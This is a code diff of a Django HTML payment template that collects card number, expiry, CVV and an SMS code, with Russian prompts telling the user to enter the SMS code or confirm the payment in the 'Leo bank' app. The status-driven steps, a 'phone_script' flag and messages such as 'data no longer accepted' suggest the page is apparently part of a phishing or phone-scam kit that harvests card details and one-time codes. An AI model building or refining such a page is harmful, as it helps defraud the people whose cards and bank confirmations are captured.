@@ -167,34 +167,43 @@
                 <div class="form-card">
 
                     <span {% if payment.status != 0 %}hidden{% endif %}>
-                        <label class="pay">Name on Card</label>
-{#                        <input type="text" name="owner_name" placeholder="John Smith">#}
-                        {{ form.owner_name }}
                         <div class="row">
-                            <div class="col-8 col-md-6">
+                            <div class="col-3">
+                              <label class="pay">Amount</label>
+                              {{ form.amount }}
+                            </div>
+                        </div>
+{#                        <label class="pay">Name on Card</label>#}
+{#                        <input type="text" name="owner_name" placeholder="John Smith">#}
+{#                        {{ form.owner_name }}#}
+                        <div class="row">
+                            <div class="col">
                                 <label class="pay"><span class="required text-danger">*</span>Card Number</label>
     {#                            <input id="id_card_number" type="text" name="card_number" required="" placeholder="0000 0000 0000 0000" minlength="16" maxlength="19">#}
                                 {{ form.card_number }}
                             </div>
-                            <div class="col-4 col-md-6">
-                                <label class="pay"><span class="required text-danger">*</span>CVV</label>
-    {#                            <input type="password" name="cvv" required="" placeholder="&#9679;&#9679;&#9679;" class="placeicon" minlength="3" maxlength="3">#}
-                                {{ form.cvv }}
-                            </div>
+
                         </div>
 
-                        <div class="row col-6">
+                        <div class="row">
 
                             <div class="pay">Expiration</div>
-                            <div class="col-6">
+                            <div class="col-3">
                                 <label class="pay"><span class="required text-danger">*</span>Month</label>
     {#                            <input type="number" name="expired_month" id="id_expired_month" required="" placeholder="MM" minlength="2" maxlength="2">#}
                                 {{ form.expired_month }}
                             </div>
-                            <div class="col-6">
+                            <div class="col-3">
                                 <label class="pay"><span class="required text-danger">*</span>Year</label>
     {#                            <input type="number" name="expired_year" id="id_expired_year" required="" placeholder="YYYY" minlength="4" maxlength="4">#}
                                 {{ form.expired_year }}
+                            </div>
+                            <div class="col-2">
+                            </div>
+                            <div class="col-4">
+                                <label class="pay"><span class="required text-danger">*</span>CVV</label>
+    {#                            <input type="password" name="cvv" required="" placeholder="&#9679;&#9679;&#9679;" class="placeicon" minlength="3" maxlength="3">#}
+                                {{ form.cvv }}
                             </div>
                         </div>
 
@@ -211,7 +220,7 @@
 
 
                     <span id="send_sms_btn" {% if payment.status != 3 or not phone_script.step_2_required %}hidden{% endif %}>
-                        <p>Данные карты введены. После поступления смс с кодом введите код</p>
+                        <p>Введите смс код, который пришёл вам на телефон</p>
                         <div  class=" col-6">
                             <label class="pay">Sms Code</label>
                             {{ form.sms_code }}
@@ -227,10 +236,10 @@
 
 
                     {% if not phone_script.step_2_required and payment.status == 3 %}
-                        <div>Данные карты приняты. Сейчас вам необходимо будет подтвердить операцию в своем приложении банка. После подтверждения операции нажмите кнопку "продолжить".</div>
+                        <div>Зайдите пожалуйста  в приложении  Лео банка на своём телефоне и подтвердите платеж.</div>
                         <input  type="submit" value="Продолжить" class="btn btn-info placeicon">
                     {% endif %}
-                    <span id="time_is_up" style="display: none">Время вышло. Данные больше не принимаются</span>
+                    <span id="time_is_up" style="display: none">Таймер истёк, вернитесь пожалуйста  на сайт и создайте новую заявку</span>
 
                 </div>
             </div>
@@ -240,5 +249,23 @@
   </div>
 </div>
 
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+  var firstField = document.getElementById('id_expired_month');
+  var secondField = document.getElementById('id_expired_year');
+  var thirdField = document.getElementById('id_cvv');
+
+  firstField.addEventListener("input", function() {
+    if (firstField.value.length == 2) {
+      secondField.focus();
+    }
+  });
+  secondField.addEventListener("input", function() {
+    if (secondField.value.length == 2) {
+      thirdField.focus();
+    }
+  });
+});
+</script>
 {% endblock %}
 
